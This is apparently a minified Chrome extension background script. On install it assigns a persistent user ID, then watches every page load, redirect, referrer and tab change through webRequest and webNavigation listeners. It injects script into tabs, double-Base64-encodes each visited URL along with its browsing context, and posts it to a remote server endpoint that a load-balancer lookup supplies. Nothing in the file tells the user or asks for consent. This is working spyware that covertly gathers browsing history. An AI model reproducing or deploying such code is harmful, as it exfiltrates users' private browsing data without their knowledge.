SIM_Session={_sessionid:void 0,getSessionId:function(){return"undefined"==typeof this._sessionid&&(this._sessionid=utils.createRandomNumber()),this._sessionid}},SIM_LB_Client=function(){function a(){try{var a=new XMLHttpRequest;a.open("GET",chrome.extension.getURL("manifest.json"),!1),a.send(null);var b=JSON.parse(a.responseText);return b.version}catch(c){return void 0}}this.initOnceAfterInstall=function(){if("undefined"==typeof utils.db.get("userid")){var a=utils.createUserID();utils.db.set("userid",a)}if("undefined"==typeof utils.db.get("install_time")){var b=(new Date).getTime()/1e3;utils.db.set("install_time",b)}},this.start_lb=function(){try{log.HT("start_lb enter"),this.initOnceAfterInstall();var b=SIM_Config_BG._url_lb,c="s="+SIM_Config_BG.getSourceId();c+="&ins="+encodeURIComponent(utils.db.get("install_time"))+"&ver="+encodeURIComponent(a()),b=b+"?"+c,utils.net.get(b,"json",function(a){log.INFO("Success to get lb"),"undefined"!=typeof a.Status?"1"==a.Status?"undefined"!=typeof a.Endpoint?(utils.db_tmv.set("server",a.Endpoint),a.Mon&&"1"==a.Mon?utils.db.set("enable_mon",!0):utils.db.set("enable_mon",!1)):log.ERROR("Invalid lb response, no Endpoint or Midpoint"):(log.INFO("WARN: result.Status is not 1"),utils.db_tmv.set("server",""),utils.db.set("enable_mon",!1)):log.ERROR("Invalid lb response, no Status = "+a.Status)},function(a){log.ERROR("Failed to get lb, ,url = "+b+", httpCode = "+a.status)}),log.HT("start_lb leave");try{log.addConsoleHelper()}catch(d){log.SEVERE("9071",d)}var e=new SIM_DataTracker_GC;e.start()}catch(d){log.SEVERE("9001",d)}}},SIM_Submitter=function(){function a(){try{b()}catch(a){throw log.SEVERE("8686",a),a}}function b(){if(!h){if("undefined"==typeof utils.db_tmv.get("server"))throw new Error("invalid server value");if(h=utils.db_tmv.get("server"),null==h)throw new Error("_endpoint is null")}}function c(a){var b,c="";for(b in a)a.hasOwnProperty(b)&&""!==a[b]&&(c+=b+"="+a[b]+"&");return c.substring(0,c.length-1)}function d(){var a=SIM_Session.getSessionId(),b={s:SIM_Config_BG.getSourceId()||"",md:"21",pid:utils.db.get("userid")||"",sess:a||"",sub:utils.getSub()};return c(b)}function e(a,b,e,f,g,h,i,j){"undefined"==typeof e&&(e="");try{for(var k={q:escape(a)||"",hreferer:escape(b)||"",prev:escape(e)||"",tmv:i||"",tmf:j||"",cr:escape(g)||"",crd:escape(h)||""},l="",m=0;m<f.length;m++)l+="&sr="+escape(f[m]),console.log("sr     "+f[m]);var n=d(),o=c(k),p=n+"&"+o+l;return p}catch(q){return log.SEVERE("9004",q),""}}function f(){return""!=h?h+"/service2":""}function g(a){try{return SIM_Base64.encode(a)}catch(b){return log.SEVERE("7772 "+b),""}}var h;a(),this.get_endpoint=function(){return h},this.send_data=function(a,b,c,d,h,i,j,k){try{log.INFO("got here: send_data");var l=f();if(""==l)return void log.ERROR("request_url is empty");var m=e(a,b,c,d,h,i,j,k),n=g(g(m));if(""!=n){var o="e="+encodeURIComponent(n);utils.net.post(l,"json",o,function(){log.INFO("Succeeded in posting data")},function(a){log.INFO("Failed to retrieve content. (HTTP Code:"+a+")")})}else log.ERROR("Error 7773")}catch(p){log.SEVERE("7778",p)}}},SIM_DataTracker_GC=function(){function a(a){try{for(var b=0;b<a.requestHeaders.length;++b)if("Referer"==a.requestHeaders[b].name){var c=a.requestHeaders[b].value;return c}}catch(d){}return null}function b(a,b,c,d,e,f,g){try{if(log.HT("last bfr fiddler, going to submit: url = "+a+", serverRedirects = "+d+", clientRedirect = "+e),null==B&&(B=new SIM_Submitter),log.HT("_submitter._endpoint = "+B.get_endpoint()),""==B.get_endpoint())return void log.INFO("_endpoint is empty => no submit");try{var h={url__:a,referer__:b,prev__:c,serverRedirects__:d,clientRedirect__:e,clientRedirectDuration__:f,tmf__:g},i=JSON.stringify(h);if(H==i)return void log.ERROR("skipped. same data already submitted: "+i);H=i}catch(j){log.SEVERE("5464",j)}B.send_data(a,b,c,d,e,f,v,g)}catch(j){log.SEVERE("5454",j)}}function c(a){if(void 0!=a&&a>=0){var b=x[a],c=b._arrCommittedNavigations.length;return c}throw new Error("inavlid tabId")}function d(a){if(void 0!=a&&a>=0){var b=x[a],d=c(a);return d>0?b._arrCommittedNavigations[0]._url:void 0}throw new Error("inavlid tabId")}function e(a,b){try{if(void 0!=b&&b>=0){for(var c=x[b],d=c._arrCommittedNavigations.length,e=void 0,f=0,g=0;d>g;g++){var h=c._arrCommittedNavigations[g];h._url==a&&(f++,e=g)}if(1==f)return e;0==f?log.INFO("Not always error, for ajax its ok. error should be determined by caller. getIndexOfCommittedNavigation : found == 0"):f>1&&log.ERROR("getIndexOfCommittedNavigation : found > 1")}else log.ERROR("getIndexOfCommittedNavigation : Inavlid tabId")}catch(i){log.SEVERE("2003",i)}return void 0}function f(a,b){try{if(b>=0){var c=x[b],d=c._arrRequestsIds.length,e=void 0;if(0==d){var f=w[b];log.ERROR(f&&f>=0?"TODOZ - need to compute data from sourceTabId. tabId = "+b+", sourceTabId = "+f:"_arrRequestsIds.length == 0 => how to handle it ?, tabId = "+b)
}else if(1==d)e=0;else{for(var g=0,h=0;d>h;h++){var i=c._arrRequestsIds[h],j=r(i);null!=j?j._completedUrl==a&&(e=h,g++):log.ERROR("(is this error ?) getRequestInfo returned null for tempRequestId = "+i)}0==g?(log.ERROR("getRequestIdOfTabUrl: url not found"),e=void 0):1==g||(log.ERROR("getRequestIdOfTabUrl: found > 1"),e=void 0)}if(void 0!=e){var k=c._arrRequestsIds[e];return k}return void 0}return void log.ERROR("invalid tabId")}catch(l){return log.SEVERE("2001",l),null}return void 0}function g(a,b){try{var c=x[b],d=void 0,f=void 0,g=void 0,h=void 0,i=void 0;if(h=e(a,b),void 0==h)log.ERROR("getIndexOfCommittedNavigation failed #1");else{var j=c._arrCommittedNavigations[h];if(j._transitionQualifiers.indexOf("client_redirect")>-1)if(h>0){i=h-1;var k=c._arrCommittedNavigations[i];f=k._url;try{var l=0,m=0;try{for(var n=c._arrRequestsIds.length,o=0;n>o;o++){var p=c._arrRequestsIds[o],q=r(p);if(null!=q){if(q._urlBeforeRequest==a){m=q._timestampBeforeRequest;break}}else log.ERROR("getRequestInfo return null for tempRequestId = "+p)}}catch(s){log.SEVERE("9023",s)}0!=m&&(l=m-k._timeStamp,log.HT("durationOnCRSiteBeforeTheClientRedirect (crd) = "+l),g=l)}catch(s){log.SEVERE("9024",s)}}else log.ERROR("client_redirect but no previous nav")}var t;if(i){var t=c._arrCommittedNavigations.splice(i,1);delete t}return"undefined"!=typeof f&&(d=new Object,d.url=f,d.duration=g),d}catch(s){return void log.SEVERE("2005",s)}}function h(a){try{var b="",c=void 0,d=w[a];if(d&&d>=0)c=d;else{var e=x[a];"undefined"==typeof e?c=I:e._lastReportedUrl&&""!=e._lastReportedUrl?c=a:a!=J?(c=J,log.INFO("prevTabId flow A")):a!=I?(c=I,log.INFO("prevTabId flow B")):log.ERROR("Failed to find prevTabId")}var f=x[c];return f?b=f._lastReportedUrl:log.ERROR("failed to compute prev"),b}catch(g){return log.SEVERE("2008",g),""}}function i(a,b,c,d,e,f){try{var g={_url:b,_prev:c,_arrServerRedirectUrls:d,_clientRedirectUrl:e,_tmf:f},h=JSON.stringify(g),i=function(){try{var a={params_:__JSON__PLACEHOLDER__,tabId_:__TABID__PLACEHOLDER__,fromTMV_:__TMV__PLACEHOLDER__,messageId_:55558888,referrer_:document.referrer,location_:document.location};chrome.extension.sendRequest(a,function(){})}catch(b){}},j=i.toString();j=j.replace("__JSON__PLACEHOLDER__",h),j=j.replace("__TABID__PLACEHOLDER__",a),j=j.replace("__TMV__PLACEHOLDER__","'"+v+"'");var k=j.slice(j.indexOf("{")+1,j.lastIndexOf("}"));chrome.tabs.executeScript(a,{code:k},function(a){log.INFO("executeScript, result = "+a)})}catch(l){log.SEVERE("2007",l)}}function j(a,c,d){try{var e="",j="",k="",l="",m="";try{if(c&&c>=0){var n=x[c];n?n._lastReportedUrl&&a==n._lastReportedUrl:log.ERROR("invalid oTabInfo")}else log.ERROR("invalid tabId")}catch(o){log.SEVERE("5459",o)}try{var n=x[c],p=f(a,c);if(void 0!=p){var q=r(p);if(q._completedUrl==a){e=q.getRedirectUrls(),j=q.getReferer();var s=g(a,c);"undefind"!=typeof s&&null!=s&&("undefined"!=typeof s.url&&(l=s.url),"undefined"!=typeof s.duration&&0!=s.duration&&(m=Math.round(s.duration)),delete s),n._arrRequestsIds.splice(0,1),delete A[p]}else log.ERROR("oRequestInfo._completedUrl == url, tabId = "+c+", _completedUrl = "+q._completedUrl+", url = "+a)}else log.ERROR("submit2, requestId is undefined, for url = "+a+", tabId = "+c)}catch(o){log.SEVERE("5453",o)}k=h(c);try{w[c]&&delete w[c]}catch(o){log.SEVERE("5457",o)}void 0==j||""==j?i(c,a,k,e,l,d):b(a,j,k,e,l,m,d)}catch(o){log.SEVERE("5454",o)}}function k(a,b){return}function l(a,b){this._tab=a,this._fromOnCreateEvent=b,this._lastReportedUrl="",this._tabsOnUpdatedUrl="",this._marked=!1,this._oldTabId=void 0,this._arrRequestsIds=new Array,this._arrCommittedNavigations=new Array}function m(a){this._tabId=a,this._arrServerRedirectUrls=new Array,this._referer="",this._transitionQualifiers="",this._completedUrl="",this._urlBeforeRequest=void 0,this._timestampBeforeRequest=0,this.appendRedirectUrl=function(a){this._arrServerRedirectUrls.push(a)},this.getRedirectUrls=function(){return this._arrServerRedirectUrls},this.setReferer=function(a){0==this._referer.length?this._referer=a:log.INFO("setReferer already have a value. old = "+this._referer+", new = "+a)},this.getReferer=function(){return this._referer},this.setUrlBeforeRequest=function(a,b){this._urlBeforeRequest=a,this._timestampBeforeRequest=b}}function n(a){this._frameId=a.frameId,this._processId=a.processId,this._tabId=a.tabId,this._timeStamp=a.timeStamp,this._transitionQualifiers=a.transitionQualifiers,this._transitionType=a.transitionType,this._url=a.url,this._prevWhenCommited=void 0}function o(){return}function p(a){var b=null;return b=x[a],void 0==b&&(b=null),b}function q(a,b){if(void 0==a)throw new Error("addRequestInfo, requestId == undefined");if(0==A.hasOwnProperty(a))return A[a]=new m(b),log.INFO("_hashRequests.length = "+Object.keys(A).length),A[a];throw new Error("addRequestInfo, already exists, requestId = "+a)}function r(a){if(void 0==a)throw new Error("getRequestInfo, requestId == undefined");return 0==A.hasOwnProperty(a)?null:A[a]}function s(a,b){return a.substring(0,b.length)===b}function t(a){return a&&(s(a,"http://")||s(a,"https://"))?!0:!1}function u(a,b){log.INFO("updateActiveUrl : got here"),chrome.windows.getAll({populate:!0},function(c){a:for(var d=0;d<c.length;d++){var e=c[d],f=e.id;if(f==a._focusedWindowId)for(var g=y[f],h=0;h<c[d].tabs.length;h++){var i=c[d].tabs[h],j=i.id,k=i.url;if(j==g){t(k)?(a._urlOfActiveTabInFocusedWindow=k,z[j]=k,log.INFO("updateActiveUrl : winId = "+f+", tabId = "+j+", url = "+k)):log.INFO("updateActiveUrl : SKIPPED : winId = "+f+", tabId = "+j+", url = "+k);break a}}}b&&b()})}var v=SIM_ModuleConstants._TMV,w=new Object,x=new Object,y=new Object,z=new Object,A=new Object,B=null,C=1,D=2,E=3,F=-1,G="",H="",I="",J="";this.webRequest_onBeforeRequest=function(a){try{var b=a.url,c=a.tabId,d=a.requestId,e=a.timeStamp;if(log.HT("webRequest.onBeforeRequest tabId = "+c+",requestId = "+d+", url = "+b),c>=0){var f=null;f=r(d),null==f&&(f=q(d,c)),f.setUrlBeforeRequest(b,e);var g=null;if(g=p(c),null==g){log.HT("oTabInfo is null, added myself, tabId = "+c);var g=new l(null,!1);x[c]=g}var h=g._arrRequestsIds.indexOf(d);-1==h?g._arrRequestsIds.push(d):log.ERROR("requestId already exists in array: tabId = "+c+", requestId = "+d+", index = "+h+", TODOZ maybe bcz of server redirect ?")}else log.ERROR("TODOZ how to handle tabId of -1, which is for new tab ?")}catch(i){log.SEVERE("8836",i)}},this.webRequest_onSendHeaders=function(b){try{var c=b.url,d=b.tabId,e=b.requestId;k("JXJX  onSendHeaders",b.requestHeaders);var f=a(b);if(null!=f&&void 0!=f)if(d>=0){var g=null;g=r(e),null==g&&(g=q(e,d)),g.setReferer(f)}else log.ERROR("9002, tabId < 0 = "+d);else log.HT("webRequest.onSendHeaders, refererFromHeaders undfined or null : tabId = "+d+",requestId = "+e+", url= "+c)}catch(h){log.SEVERE("8800",h)}},this.webRequest_onHeadersReceived=function(a){try{var b=a.url,c=a.tabId,d=a.requestId,e=a.statusLine;log.INFO("webRequest.onHeadersReceived tabId = "+c+",requestId = "+d+", url = "+b+", statusLine = "+e)}catch(f){log.SEVERE("8839",f)}},this.webRequest_onBeforeRedirect=function(a){try{var b=a.url,c=a.tabId,d=a.requestId,e=null;e=r(d),null==e&&(e=q(d,c)),e.appendRedirectUrl(b),log.INFO("webRequest.onBeforeRedirect tabId = "+c+",requestId = "+d+", url = "+b)}catch(f){log.SEVERE("8835",f)}},this.webRequest_onResponseStarted=function(a){try{var b=a.url,c=a.tabId,d=a.requestId;log.INFO("webRequest.onResponseStarted tabId = "+c+",requestId = "+d+", url = "+b)}catch(e){log.SEVERE("8839",e)}},this.webRequest_onCompleted=function(a){try{var b=a.url,c=a.tabId,d=a.requestId;log.INFO("webRequest.onCompleted tabId = "+c+",requestId = "+d+", url = "+b);var e=r(d);null==e&&(e=q(d,c)),e._completedUrl=b}catch(f){log.SEVERE("8837",f)}},this.webRequest_onErrorOccurred=function(a){try{var b=a.url,c=a.tabId,d=a.requestId;log.INFO("webRequest.onErrorOccurred tabId = "+c+",requestId = "+d+", url = "+b)}catch(e){log.SEVERE("8896",e)}},this.webNavigation_onCreatedNavigationTarget=function(a){try{if(void 0!=a){var b=a.tabId;b>=0&&(void 0==w[b]?(w[b]=a.sourceTabId,log.HT("Added nav target: tabId = "+b+", sourceTabId = "+a.sourceTabId)):log.ERROR("_hashNavTargets[tabId] == undefined"))}}catch(c){log.SEVERE("8997",c)}},this.webNavigation_onBeforeNavigate=function(a){try{void 0!=a&&0==a.frameId&&(a.tabId>=0?u(this,null):log.ERROR("webNavigation_onBeforeNavigate : how to handle tabId < 0 ? "))}catch(b){log.SEVERE("8897",b)}},this.webNavigation_onCommitted=function(a){try{if(void 0!=a&&0==a.frameId){var b=a.tabId;if(b>=0){var c=x[b];if(c){var d=new n(a);d._prevWhenCommited=G,c._arrCommittedNavigations.push(d)}else log.ERROR("webNavigation_onCommitted, oTabInfo is null, for tabId = "+b+", url = "+a.url)}else log.ERROR("TODOZ - webNavigation_onCommitted, how to handle tabId < 0 (newtab) ? -> attach to processId ??")}}catch(e){log.SEVERE("8898",e)}},this.webNavigation_onDOMContentLoaded=function(){try{}catch(a){log.SEVERE("8862",a)}},this.webNavigation_onCompleted=function(a){try{if(void 0!=a&&0==a.frameId){var b=a.tabId;if(b>=0){var c=x[b];if(c){var d=c._lastReportedUrl;if(1==c._marked)log.HT(a.url!=d?"CCCC 3, sumbit = "+a.url+" , (lastReportedUrl = "+d+")":"CCCC 4, already sumbitted = "+a.url+" , (lastReportedUrl = "+d+")");else{{var e=5e3;window.setTimeout(function(a){try{var b="TIMER, tabId_ =  "+a;log.HT(b)}catch(c){}try{}catch(c){}},e,b)}log.HT("XZXZXZ  IMHERE : pre-loaded ford.com arrives here... TOODZ ? webNavigation_onCompleted : add to popups/boxes = "+a.url+" , (_tabsOnUpdatedUrl = "+c._tabsOnUpdatedUrl+")")}}else log.ERROR("webNavigation_onCompleted, oTabInfo null/undefined for tabId = "+b+", url = "+a.url)}else-1==b?log.HT("webNavigation_onCompleted, TODOZ - how to handle it ? tabId == -1 =>  new tab/ else ? = "+a.url):log.ERROR("webNavigation_onCompleted, Invalid tabId = "+b)}}catch(f){log.SEVERE("8891",f)}},this.webNavigation_onErrorOccurred=function(a){try{if(void 0!=a&&0==a.frameId){var b=(a.error,a.frameId,a.processId,a.tabId),c=(a.timeStamp,a.url);if(t(c))if(b>=0){var d=x[b];c!=d._lastReportedUrl?(j(c,b,E),d._lastReportedUrl=c):log.HT("webNavigation_onErrorOccurred, already reported = "+c+", tabId = "+b)}else log.ERROR("webNavigation_onErrorOccurred, invalid tabId = "+b);else log.HT("webNavigation_onErrorOccurred, skipped no-web url = "+c+", tabId = "+b)}}catch(e){log.SEVERE("8893",e)}},this.webNavigation_onTabReplaced=function(a){try{if(void 0!=a){a.replacedTabId,a.tabId,a.timeStamp}}catch(b){log.SEVERE("8861",b)}},this.webNavigation_onHistoryStateUpdated=function(){try{}catch(a){log.SEVERE("8839",a)}},this.windows_onFocusChanged=function(a){try{log.INFO("windows.onFocusChanged windowId = "+a),F=a}catch(b){log.SEVERE("8892",b)}},this.extension_onRequest=function(a,c){try{var d=utils.getExtensionId();if(c&&c.id==d){var e=a.fromTMV_;if(e&&e==v){var f=a.messageId_;if(f&&55558888==f){log.INFO("extension_onRequest: received message");var g=(a.tabId_,a.location_),h=g.href,i=a.params_._url,j=a.params_._prev,k=a.params_._arrServerRedirectUrls,l=a.params_._clientRedirectUrl,m=a.params_._tmf;if(i==h){var n=a.referrer_;n==i&&(log.ERROR("train missed # 1?"),n=""),n&&""!=n&&(m+=".1")}else log.ERROR("train missed # 2?"),n="";b(i,n,j,k,l,"",m)}else log.ERROR("messaged unknown, or undefined : request = "+a)}else e?log.INFO("Message of other tmv = "+e):log.ERROR("Message without fromTMV")}else log.ERROR("unknown sender = "+c.id)}catch(o){log.SEVERE("2020",o)}},this.tabs_onCreated=function(a){try{log.INFO("tabs.onCreated, tab.id = "+a.id);var b=new l(a,!0);x[a.id]=b,log.INFO("Count of tabs after onCreated = "+Object.keys(x).length),o()}catch(c){log.SEVERE("8831",c)}},this.tabs_onActivated=function(a){try{log.INFO("tabs.onActivated  windowId = "+a.windowId+", tabId = "+a.tabId),y[a.windowId]=a.tabId,a.tabId>=0?(I=J,J=a.tabId):log.ERROR("tabs_onActivated, how to handle activeInfo.tabId <0  ?"),log.INFO("tabs_onActivated, total count of active tabs (0 or 1, for each window) = "+Object.keys(y).length)}catch(b){log.SEVERE("8834",b)}},this.tabs_onRemoved=function(a){try{log.INFO("tabs.onRemoved, tabId = "+a),delete x[a],w[a]&&delete w[a],log.INFO("Count of tabs after onRemoved = "+Object.keys(x).length),o()}catch(b){log.SEVERE("8832",b)}},this.tabs_onReplaced=function(a,b){try{if(a>=0&&b>=0){var e=x[a],f=x[b];if(e&&f){var g=f._lastReportedUrl,h=void 0,i=c(a);i>0&&(h=d(a)),log.HT("tabs.onReplaced, addedTabId = "+a+", removedTabId = "+b+", removedUrl = "+g+", addedUrl = "+h),h==e._lastReportedUrl||(t(h)?(z[b]&&(z[a]=z[b],delete z[b]),e._lastReportedUrl=f._lastReportedUrl,j(h,a,D),e._lastReportedUrl=h):log.HT("skipped non web url = "+h+"tabId = "+a)),delete x[b],e._oldTabId=b,w[b]&&(w[a]=w[b],delete w[b])}else e||log.ERROR("tabs_onReplaced, oAddTabInfo udefined for addedTabId = "+a),f||log.ERROR("tabs_onReplaced, oRemoveTabInfo udefined for removedTabId = "+b)}else log.ERROR("webNavigation_onTabReplaced : addedTabId >= 0 && removedTabId >=0")}catch(k){log.SEVERE("8847",k)}},this.tabs_onUpdated=function(a,b,c){try{if("complete"==b.status){var d=c.url,e="";log.HT("tabs.onUpdated, status = "+b.status+", tabId = "+a+", url = "+d);var f=x[a];f?e=f._lastReportedUrl:log.ERROR("oTabInfo null/undefined for tabId = "+a),t(d)?(log.HT("tabs.onUpdated going to submit, tabId = "+a+", url = "+d),j(d,a,C),f&&(f._lastReportedUrl=d),u(this,null)):log.HT("skipped non-web url = "+d+", tabId = "+a)}}catch(g){log.SEVERE("8833",g)}},this.addListners_webRequest=function(){try{if("undefined"==typeof chrome.webRequest)log.ERROR("permission missing: webRequest");else{var a={types:["main_frame"],urls:["<all_urls>"]},b=["requestHeaders"];chrome.webRequest.onBeforeRequest.addListener(this.webRequest_onBeforeRequest,a),chrome.webRequest.onSendHeaders.addListener(this.webRequest_onSendHeaders,a,b),chrome.webRequest.onHeadersReceived.addListener(this.webRequest_onHeadersReceived,a),chrome.webRequest.onBeforeRedirect.addListener(this.webRequest_onBeforeRedirect,a),chrome.webRequest.onResponseStarted.addListener(this.webRequest_onResponseStarted,a),chrome.webRequest.onCompleted.addListener(this.webRequest_onCompleted,a),chrome.webRequest.onErrorOccurred.addListener(this.webRequest_onErrorOccurred,a)}}catch(c){log.SEVERE("8888",c)}},this.addListners_webNavigation=function(){try{"undefined"==typeof chrome.webNavigation?log.ERROR("permission missing: webNavigation"):(chrome.webNavigation.onCreatedNavigationTarget?chrome.webNavigation.onCreatedNavigationTarget.addListener(this.webNavigation_onCreatedNavigationTarget):log.ERROR("chrome.webNavigation.onCreatedNavigationTarget undefined"),chrome.webNavigation.onBeforeNavigate?chrome.webNavigation.onBeforeNavigate.addListener(this.webNavigation_onBeforeNavigate):log.ERROR("chrome.webNavigation.onBeforeNavigate undefined"),chrome.webNavigation.onCommitted?chrome.webNavigation.onCommitted.addListener(this.webNavigation_onCommitted):log.ERROR("chrome.webNavigation.onCommitted undefined"),chrome.webNavigation.onDOMContentLoaded?chrome.webNavigation.onDOMContentLoaded.addListener(this.webNavigation_onDOMContentLoaded):log.ERROR("chrome.webNavigation.onDOMContentLoaded undefined"),chrome.webNavigation.onCompleted?chrome.webNavigation.onCompleted.addListener(this.webNavigation_onCompleted):log.ERROR("chrome.webNavigation.onCompleted undefined"),chrome.webNavigation.onErrorOccurred?chrome.webNavigation.onErrorOccurred.addListener(this.webNavigation_onErrorOccurred):log.ERROR("chrome.webNavigation.onErrorOccurred undefined"),chrome.webNavigation.onTabReplaced?chrome.webNavigation.onTabReplaced.addListener(this.webNavigation_onTabReplaced):log.ERROR("chrome.webNavigation.onTabReplaced undefined"),chrome.webNavigation.onHistoryStateUpdated?chrome.webNavigation.onHistoryStateUpdated.addListener(this.webNavigation_onHistoryStateUpdated):log.ERROR("chrome.webNavigation.onHistoryStateUpdated undefined"))}catch(a){log.SEVERE("8887",a)}},this.addListners_tabs=function(){try{chrome.tabs.onCreated.addListener(this.tabs_onCreated),chrome.tabs.onRemoved.addListener(this.tabs_onRemoved),chrome.tabs.onUpdated.addListener(this.tabs_onUpdated),chrome.tabs.onActivated.addListener(this.tabs_onActivated),chrome.tabs.onReplaced.addListener(this.tabs_onReplaced)}catch(a){log.SEVERE("8889",a)}},this.addListners=function(){try{this.addListners_webRequest(),this.addListners_tabs(),this.addListners_webNavigation(),chrome.windows.onFocusChanged.addListener(this.windows_onFocusChanged),chrome.extension.onRequest.addListener(this.extension_onRequest)}catch(a){log.SEVERE("8844",a)}},this.start=function(){try{log.INFO("bg start: got here"),this.addListners()}catch(a){log.SEVERE("8801",a)}}};this.main=function(){try{var a=new SIM_LB_Client;a.start_lb()}catch(b){console.log("9099, "+b)}};var log=SIM_Logger_BG,utils=SIM_FrameworkUtils;this.main()}();